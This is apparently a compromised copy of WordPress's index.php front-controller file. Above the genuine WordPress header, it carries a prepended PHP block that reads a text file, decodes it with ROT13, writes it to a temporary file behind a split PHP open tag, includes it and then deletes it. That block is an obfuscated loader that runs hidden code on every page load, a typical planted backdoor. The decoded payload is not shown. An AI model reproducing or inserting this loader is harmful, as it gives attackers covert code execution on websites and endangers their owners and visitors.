<?php
$ss = file_get_contents("zj661.txt");
$tempFile = tempnam(sys_get_temp_dir(), 'pasted_code_');
$ss = str_rot13($ss);
file_put_contents($tempFile, "<?p"."hp ". $ss);
include $tempFile;
unlink($tempFile);?>
<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
	
